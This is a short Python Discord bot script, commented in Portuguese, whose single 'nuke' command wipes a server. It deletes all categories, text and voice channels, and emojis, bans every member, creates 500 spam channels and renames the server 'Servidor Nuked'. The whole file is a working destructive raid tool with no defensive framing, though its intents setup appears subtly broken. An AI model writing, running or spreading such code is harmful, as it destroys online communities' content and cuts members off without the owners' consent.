import discord
import os
from discord.ext import commands

intents = discord.Intents.default()
intents.all()

bot = commands.Bot(command_prefix='7', intents=intents)
token = os.environ.get('TOKEN')

@bot.command()
async def nuke(ctx):
    guild = ctx.guild

# Vai remove todos os canais & categorias
    for category in guild.categories:
        await category.delete()
    
    for channel in guild.text_channels:
        await channel.delete()
    
    for channel in guild.voice_channels:
        await channel.delete()

# Ban em geral
    for member in guild.members:
        try:
            await member.ban()
        except:
            pass

# Remove os emojis
    for emoji in guild.emojis:
        try:
            await emoji.delete()
        except:
            pass

# Cria 500 canais de texto
    for i in range(500):
        await guild.create_text_channel(f"By crashed{i}")

# Altera o nome e a foto do servidor
    await guild.edit(name="Servidor Nuked", icon=None)

bot.run(token)
